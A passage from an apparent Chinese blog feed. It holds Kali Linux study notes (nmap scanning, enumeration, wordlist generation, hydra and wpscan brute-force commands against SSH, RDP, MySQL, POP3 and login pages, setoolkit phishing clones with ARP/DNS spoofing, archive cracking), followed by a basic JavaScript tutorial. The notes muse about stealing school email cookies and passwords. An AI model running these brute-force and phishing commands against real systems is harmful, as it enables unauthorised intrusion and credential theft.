target_ip</span><br></pre></td></tr></table></figure><ul><li>Ping扫描:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -v target_ip</span><br></pre></td></tr></table></figure><ul><li>快速端口扫描:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -F -v target_ip</span><br></pre></td></tr></table></figure><ul><li>版本扫描:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -v target_ip </span><br></pre></td></tr></table></figure><ul><li>操作系统扫描:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O -v target_ip</span><br></pre></td></tr></table></figure><ul><li>运行标记为safe的nse script</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sC -v target_ip</span><br></pre></td></tr></table></figure></blockquote><h4 id="提高nmap扫描效率"><a href="#提高nmap扫描效率" class="headerlink" title="提高nmap扫描效率"></a>提高nmap扫描效率</h4><blockquote><p>各参数的含义<br>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了，具体自己百度了解</p><p>-Pn： 禁用PING检测</p><p>-p： ports，要检测的端口号，比如80</p><p>-n： 功能未知，在V2EX上看到的</p><p>–open： 只输出检测状态为open的端口，即开放的端口，参考文章《快速高效:Nmap结果整理方法》</p><p>–min-hostgroup 1024：调整并行扫描组的大小，参考文章《详尽的Nmap扫描参数解析》</p><p>–min-parallelism 1024：调整探测报文的并行度</p><p>–host-timeout 30：检测超时的跳过</p><p>-T4：总共有T0-T5，貌似T4比较折中，参考文章《Nmap参考指南：十一、 时间和性能》</p><p>-v：打印详细扫描过程</p><p>-oG：输出为比较人性化的格式，一条记录一行，后期好处理</p><p>-iL：载入ip段文件，批量扫，不用一条条执行了。</p></blockquote><p>方法二</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -Pn -p 80 -n --open --min-hostgroup 1024 --min-parallelism 10 --host-timeout 30 -T4 -v -oG results-all.txt -iL ipduan.txt</span><br></pre></td></tr></table></figure></blockquote><blockquote><p>各参数的含义：</p><p>-sS：使用SYN方式扫描，默认用的是-sT方式，即TCP方式，需要完成完整的三次握手，比较费时，SYN就比较快一些了，具体自己百度了解</p><p>-Pn： 禁用PING检测</p><p>-p： ports，要检测的端口号，比如80</p><p>-n： 功能未知，在<a href="https://seofangfa.com/goto/https://www.v2ex.com/t/269579">V2EX上看到的</a></p><p>–open： 只输出检测状态为open的端口，即开放的端口，参考文章<a href="https://seofangfa.com/other-note/nmap-jiasu.html">《快速高效:Nmap结果整理方法》 </a></p><p>–min-hostgroup 1024：调整并行扫描组的大小，参考文章<a href="https://seofangfa.com/other-note/nmap-canshu.html">《详尽的Nmap扫描参数解析》 </a></p><p>–min-parallelism 1024：调整探测报文的并行度</p><p>–host-timeout 30：检测超时的跳过 </p><p>-T4：总共有T0-T5，貌似T4比较折中，参考文章<a href="https://seofangfa.com/goto/https://wizardforcel.gitbooks.io/nmap-man-page/content/11.html">《</a><a href="https://seofangfa.com/goto/https://wizardforcel.gitbooks.io/nmap-man-page/content/11.html">Nmap参考指南：十一、 时间和性能》</a></p><p>-v：打印详细扫描过程</p><p>-oG：输出为比较人性化的格式，一条记录一行，后期好处理</p><p>-iL：载入ip段文件，批量扫，不用一条条执行了。</p><p>以上参考：<a href="https://seofangfa.com/other-note/nmap-tishu.html">https://seofangfa.com/other-note/nmap-tishu.html</a></p></blockquote><p>知道系统版本信息后</p><p>exploit-db.com 墙外浏览 或者 github搜索ms17010</p><hr><p>学技术时需要思考的问题：</p><p>为什么，什么时候用？</p><p>有些学校，作业发邮件，邮箱密码如何破解，抓到目标 电脑的指定网页邮箱cookie，实现免密码登录</p><p>有的学校指定软件或系统，这种情况漏洞出现的概率更大，压力测试，dns，arp欺骗伪造邮件服务器的环境，</p><p>学校，公司邮件服务器，主服务器信息如何探测，主服务器的密码如何获取？</p><h2 id="Kali工具使用"><a href="#Kali工具使用" class="headerlink" title="Kali工具使用"></a>Kali工具使用</h2><p>kali=有攻击工具的linux系统</p><p>parrot也挺好</p><p>2019之后用户名密码都是kali，之前是root和toor</p><p>默认不给root账号，sudo passwd root 创建root账号密码 live模式下重启需要重新创建</p><hr><p>关闭自动补全功能</p><p><strong>chsh</strong> 更改shell设定</p><p>输入密码后输入**/bin/bash**</p><p>shutdown -r now 重启</p><hr><p>使用root权限</p><p>sudo +命令</p><p>切换root ： sudu su </p><p>passwd 给root账户设置密码</p><p>exit退回原来权限</p><hr><p><strong>uname -a</strong>   发现kali是基于debian，所以使用apt-get update/upgreat 更新软件</p><p><strong>clear</strong> 清空当前终端屏幕</p><hr><p>kali自带内部web服务器  <strong>/var/www/html/</strong></p><p><strong>service apache2 start</strong> </p><p><strong>rm -rf ./*</strong>    remove -recursive（循环递归） -force ./当前目录（/是根目录，危险命令）  *所有</p><h3 id="域名信息搜集"><a href="#域名信息搜集" class="headerlink" title="域名信息搜集"></a>域名信息搜集</h3><h4 id="dnsenum-fierce-snmpcheck"><a href="#dnsenum-fierce-snmpcheck" class="headerlink" title="dnsenum-fierce-snmpcheck"></a>dnsenum-fierce-snmpcheck</h4><p><strong>dnsenum –enum [baidu.com]</strong>  扫描子域，网段等</p><p>或者</p><p><strong>fierce –domain [baidu.com]</strong></p><p>不同的子域上部署不同的服务，开放不同的端口，据此来寻找漏洞</p><p><strong>snmpcheck -t [目标]</strong>  允许用户枚举snmp设备，<strong>简单网络管理协议</strong>专门设计用于在 IP 网络管理网络节点（服务器、工作站、路由器、交换机及HUBS等）的一种标准协议</p><h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p><strong>网络测试工具</strong></p><h4 id="dmitry-nmap-netdiscover-masscan"><a href="#dmitry-nmap-netdiscover-masscan" class="headerlink" title="dmitry-nmap-netdiscover-masscan"></a>dmitry-nmap-netdiscover-masscan</h4><p><strong>dmitry -help</strong></p><p><strong>dmitry -wnpb [baidu.com]</strong> 参数可一起写，查询目标网站的信息</p><p><strong>nmap -sP [内网主机]</strong>   不深入学nmap没用，有时候不靠谱，防火墙拦截</p><p><strong>nping(nmap套件中的) -tcp -p 445(给445端口发数据包) -data AF56A43D [目标ip]</strong>   这里构造特殊data，可以刺探防火墙的反应，甚至跳过</p><p>arp-scan -l  探测内网中有哪些主机存在，并且输出mac地址，并且估计是什么设备</p><p><strong>netdiscover -i eth0</strong> [192.168.0.0/16 16相当于网络码占多少位，对多个网段扫描]也是使用当前网卡（ifconfig）对内网存活主机探测</p><p><strong>masscan -p 1-65535 192.168.1.167 –rate=100</strong>   100是觉得对方可能有防火墙，跳过防火墙的效果</p><h4 id="netbios信息搜集"><a href="#netbios信息搜集" class="headerlink" title="netbios信息搜集"></a>netbios信息搜集</h4><h5 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h5><p>通过ping计算机名可以获得东西，查到目标ip地址</p><p>文件资源管理器中，映射网络驱动器时也可以直接写计算机名字跟共享用户名即可连接到对方硬盘，而且不需要知道对方电脑密码</p><p>netbios协议可以实现计算机名变为ip地址之间的转换</p><p><strong>nbtscan [目标ip]</strong></p><p><strong>nbtscan -hv [目标ip]</strong></p><hr><h3 id="OS信息搜集"><a href="#OS信息搜集" class="headerlink" title="OS信息搜集"></a>OS信息搜集</h3><h4 id="nmap-p0f"><a href="#nmap-p0f" class="headerlink" title="nmap-p0f"></a>nmap-p0f</h4><p>nmap [ip]</p><p>nmap -p 1-1000 [ip]</p><p>nmap 192.168.1.*   </p><p>nmap -O [ip]</p><p><strong>p0f -f /xxx/xxx/x.pcap(先抓包获得的文件) -o haha.log（对抓包进行分析输出）</strong></p><h3 id="msf框架"><a href="#msf框架" class="headerlink" title="msf框架"></a>msf框架</h3><p><strong>armitage</strong>图形化界面</p><p>使用木马过程见攻击框架笔记</p><h3 id="字典生成"><a href="#字典生成" class="headerlink" title="字典生成"></a>字典生成</h3><h4 id="wpscan-cewl-wpscan-crunch-rtgen"><a href="#wpscan-cewl-wpscan-crunch-rtgen" class="headerlink" title="wpscan-cewl-wpscan-crunch-rtgen"></a>wpscan-cewl-wpscan-crunch-rtgen</h4><p>wp站（<strong>wordpress</strong>全球用的最多的<strong>CMS</strong>）密码生成器使用</p><p><strong>wpscan –url 网站</strong> 直接扫描wp站的用户名</p><p><strong>cewl 网站 -w mima.txt</strong>  根据网站生成密码（这里是根据网站猜测的）</p><p><strong>wpscan –url 网站 -U 用户名txt -P mima.txt</strong>  将上面的用户名和密码组合起来爆破，爆破出来后在wp-login.php中试一下登录</p><p>懂原理的话可以自制别的网站的工具</p><hr><p><strong>crunch 2 4(生成密码的位数2到4位) 0123456789 -o /root/mima.txt</strong>  生成密码</p><hr><p>kali自带字典路径：<strong>usr share wordlists</strong>下</p><hr><p><strong>彩虹表生成</strong></p><p><strong>rtgen md5 loweralpha 1 5 0 1000 1000 0</strong></p><p>根据提示生成彩虹表在usr/share/rainbowcrack  可以修改其中的<strong>charset.txt</strong>文件中的参数来生成不同的彩虹表</p><h3 id="网站指纹识别"><a href="#网站指纹识别" class="headerlink" title="网站指纹识别"></a>网站指纹识别</h3><p>大多数是CMS，修改而来</p><h5 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h5><p><strong>whatweb+网址</strong> 扫描CMS，中间件，服务器，cookie，httponly，httpserver</p><p>发现CMS是joomla，谷歌针对该CMS工具，kali中有joomscan的工具</p><p><strong>joomscan –url [网址]</strong>  用专门的工具扫描该CMS情况，有无防火墙，后台等</p><p><strong>searchsploit joomla 3.7.0</strong>  搜索对应版本的漏洞</p><h4 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h4><p>web application Firewalls</p><h5 id="wafw00f"><a href="#wafw00f" class="headerlink" title="wafw00f"></a>wafw00f</h5><p><strong>wafw00f [网址]</strong>   识别目标网站用了什么waf</p><p>一般国外的waf识别的比较准，国内的比较复杂，或者魔改过了，而且用工具比较浅显，用手工确认比较靠谱</p><hr><h4 id="nikto敏感目录扫描"><a href="#nikto敏感目录扫描" class="headerlink" title="nikto敏感目录扫描"></a>nikto敏感目录扫描</h4><p><strong>nikto -h [目标网站] -o output.txt[默认输出到root目录下]</strong></p><hr><h3 id="社工SET工具"><a href="#社工SET工具" class="headerlink" title="社工SET工具"></a>社工SET工具</h3><h5 id="setoolkit"><a href="#setoolkit" class="headerlink" title="setoolkit"></a>setoolkit</h5><p>里面选择社会工程学，网站克隆，可以结合ARP欺骗DNS劫持，即使输入正确的地址也是跳转到假界面。</p><p>社工获得登录名和密码</p><p>但是有时候不靠谱，可以选择里面手工网站模板</p><h4 id="网站下载工具"><a href="#网站下载工具" class="headerlink" title="网站下载工具"></a>网站下载工具</h4><h5 id="wget"><a href="#wget" class="headerlink" title="wget"></a>wget</h5><p>一种爬虫，离线搜集信息的方式，配合用来制作钓鱼网站</p><p><strong>wget</strong>命令，GNU开源项目中的一部分，主流win和linux都带有，用来下载的一个工具</p><p>wget [网址]  下载页面html</p><p>wget -r(递归下载) -p ./test(路径)  [网址]</p><p>-t 设置重试次数。当连接中断（或超时）时，wget将试图重新连接。如果指<br>定-t0，则重试次数设为无穷多。</p><p>-T,–timeout=SECONDS 设置超时时间</p><p>-e “http_proxy=<a href="http://127.0.0.1:8087&quot;">http://127.0.0.1:8087&quot;</a> 设置代理  https_proxy同理</p><p>-c 从断点出继续下载</p><p>-P 指定下载存放的目录</p><h5 id="httrack"><a href="#httrack" class="headerlink" title="httrack"></a><strong>httrack</strong></h5><p>httrack [网址] 直接下载，只需要用下载目录中的网址文件夹就好了，比较好用</p><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><h5 id="medusa-hydra"><a href="#medusa-hydra" class="headerlink" title="medusa-hydra"></a>medusa-hydra</h5><h4 id="medusa-服务密码破解"><a href="#medusa-服务密码破解" class="headerlink" title="medusa 服务密码破解"></a>medusa 服务密码破解</h4><p><strong>medusa</strong> -h [目标ip] -u test(用户名) -P（不知道的用大写，知道的用户名用小写u） mima.txt(root中的密码字典)  -M ftp(破解ftp协议的密码)</p><h4 id="hydra-服务协议密码破解"><a href="#hydra-服务协议密码破解" class="headerlink" title="hydra 服务协议密码破解"></a>hydra 服务协议密码破解</h4><p><strong>hydra</strong>  常用，支持众多协议</p><p>hydra -L [用户名字典] -P [密码字典] -t [线程] -vV（显示详细过程） -e ns（一般-e后面就加ns） [目标ip] [服务]</p><p>hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV -e ns [目标ip] ssh    破解ssh  22号端口账户密码</p><p>hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns [目标ip] http-get /admin/login.php 破解网站指定页面的登录入口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -p 密码字典 -s 80 [目标ip] http-post-form <span class="string">&quot;/admin/login.php:username=^USER^&amp;password=^PASS^&amp;submit=submit:wrong username or password&quot;</span>  <span class="comment">#对于post提交的页面</span></span><br></pre></td></tr></table></figure><p>hydra -l 用户名 -p 密码字典 xxx.pop3.mail pop3 破解pop3邮件</p><p>hydra -l boris(用户名) -P /usr/share/wordlists/fasttrack.txt 192.168.1.160 -s 55007（实验时非默认端口） pop3</p><p>远程桌面破解</p><p>hydra [目标ip] rdp -l administrator（一般win默认用户名） -P密码字典 -V</p><p>mysql密码</p><p>hydra -l root(mysql默认用户名) -p 密码字典 -e ns [目标ip] mysql  可以直接在网上破解3306端口</p><h4 id="rar文件破解"><a href="#rar文件破解" class="headerlink" title="rar文件破解"></a>rar文件破解</h4><h5 id="rarcrack"><a href="#rarcrack" class="headerlink" title="rarcrack"></a>rarcrack</h5><p>kali中没有，apt-get install rarcrack 安装</p><p>rarcrack –type rar –threads 8 a.rar</p><p>破解a.rar的压缩包，提前先在a.rar目录下创建一个a.rar.xml的文件（新版kali不需要，会自动生成）</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="meta">&lt;rarcrack&gt;</span></span><br><span class="line"><span class="meta">&lt;abc&gt;0123456789&lt;/abc&gt; 字符范围</span></span><br><span class="line"><span class="meta">&lt;current&gt;0000&lt;/current&gt; 从0000开始猜</span></span><br><span class="line"><span class="meta">&lt;good_password/&gt;</span></span><br><span class="line"><span class="meta">&lt;/rarcrack&gt;</span></span><br></pre></td></tr></table></figure><h4 id="zip文件破解"><a href="#zip文件破解" class="headerlink" title="zip文件破解"></a>zip文件破解</h4><h5 id="fcrackzip"><a href="#fcrackzip" class="headerlink" title="fcrackzip"></a>fcrackzip</h5><p>fcrackzip -b -c[密码类型] -l 1-4（长度） -u [文件名.zip] -v </p><p> -c 密码类型： a=a-z      1=0-9   A=A-Z  l=特殊字符</p><p>fcrackzip -b -c1 -l 1-4 -u b.zip -v</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kali </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Js基础语法</title>
      <link href="2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Js%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
      <url>2023/03/30/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Js%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="day1-绪论"><a href="#day1-绪论" class="headerlink" title="day1 绪论"></a>day1 绪论</h2><h3 id="路线"><a href="#路线" class="headerlink" title="路线"></a>路线</h3><p>基础</p><p>变量，数据类型，流程控制</p><p>DOM    Bom</p><p>js高级    面向对象    原型    闭包    私有    共有</p><p>DOM 文本对象模型：轮播图，淡入淡出，左右滑动，选项卡，下拉菜单，返回顶部，拖拽，表格增删改查，购物车添加功能</p><p>Bom 浏览器模型：打开窗口，关闭，cookie，定时器</p><p>原型图</p><p>ajax</p><p>h5新特性：拖拽，canvas画布，地理位置</p><p>es6</p><h3 id="js功能"><a href="#js功能" class="headerlink" title="js功能"></a>js功能</h3><p>特效，交互</p><h3 id="js起源"><a href="#js起源" class="headerlink" title="js起源"></a>js起源</h3><p>网景公司，为了丰富浏览器功能开发的语言</p><hr><h3 id="var-alert-prompt-4种命名规范-2种代码引入方式-注释"><a href="#var-alert-prompt-4种命名规范-2种代码引入方式-注释" class="headerlink" title="var\alert\prompt\4种命名规范\2种代码引入方式\注释"></a>var\alert\prompt\4种命名规范\2种代码引入方式\注释</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试js<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script src=&quot;./js.js&quot;&gt;&lt;/script&gt;  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;style&gt;类比style标签的写法，可以引入，也可以把标签写在html中&lt;/style&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script&gt;也可以写在这前面，比如加载图片&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- js引用方式 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;script&gt;通常来说写在body的最后&lt;/script&gt; --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// alert(&quot;在body代码最后的位置放一个弹窗&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">/*多行注释*/</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//单行注释</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//变量variable quantity</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//1、 var 变量=具体的值</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//2、 var 变量名;   变量名=变量值</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">// 弹窗alert(var)，字符串用“”</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//名称，可包含字母数字_$，避免数字汉字标点开头，最好有具体含义</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//匈牙利命名法boxtxt</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//下划线命名法box_txt</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//小驼峰命名法boxTxt</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//大驼峰命名法BoxTxt</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        confirm(<span class="string">&quot;这是一个确认弹框&quot;</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> index=confirm(<span class="string">&quot;点击确认就是true，取消就是false&quot;</span>);</span></span><br><span class="line">        alert(index);</span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//prompt:提醒（某人说话）</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> txt=prompt(<span class="string">&quot;输入文本到variable&quot;</span>);</span></span><br><span class="line">        alert(txt);</span><br><span class="line"><span class="javascript">        <span class="comment">//点击确认就是输入文本，取消是null</span></span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="day2-输出、基本数据类型"><a href="#day2-输出、基本数据类型" class="headerlink" title="day2 输出、基本数据类型"></a>day2 输出、基本数据类型</h2><h3 id="输出-空格"><a href="#输出-空格" class="headerlink" title="输出\空格\"></a>输出\空格\</h3><h3 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>day2<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是即将被覆盖的p段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//输出,弹窗，alert，confirm，prompt</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//控制台的console系列</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(&quot;控制台打印日志信息，常用来查错&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.error(&quot;发生错误了&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.warn(&quot;输出警告信息&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=(&quot;index大家都用来存数值，alert可以作为对象存给变量index&quot;);//这里加不加（）都可以</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //实践证明，如果这里使用alert(&quot;汉字&quot;)赋值给index，后面再使用console.log(index)不作用,prompt与confirm可以用</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var txt=123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(index);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(txt);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//关于空格</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//document.write(&quot;1  2      3&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//浏览器默认读取机制会把多个空格解析成一个</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//借鉴CSS中的&amp;nbsp，用&amp;nbsp代替空格</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//使用标签样式&quot;white-space：pre&quot;包裹</span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        // document.write(&quot;<span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&#x27;white-space:pre;&#x27;</span>&gt;</span>&quot;+&quot;1 2      3&quot;+&quot;<span class="tag">&lt;<span class="name">span</span>&gt;</span>&quot;)</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//document.write本质是在html中插入</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//window.onload页面加载之后才会执行的代码,了解，不常用</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//window.onload=function()&#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     document.write(&quot;使用document.write来重写前面的html页面&quot;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//数据类型</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//简单数据类型:数字，字符串，布尔，空，未定义；</span></span></span><br><span class="line">        </span><br><span class="line"><span class="javascript">        <span class="comment">//数值类型</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var num=123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(num);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=typeof num;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var index=typeof(num);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(index);</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="comment">//字符串string</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var num1=123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var num2=2</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var tex1=&quot;字符串可以是双引号&quot;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// var tex2=&#x27;也可以是单引号&#x27;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(num1+num2);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(tex1+tex2);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(num1+tex1);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// //这里的+是字符串拼接的效果，如果两个数据typeof都是number，就是算数相加，否则就是字符串拼接</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// console.log(num1 + num2 + tex1 + 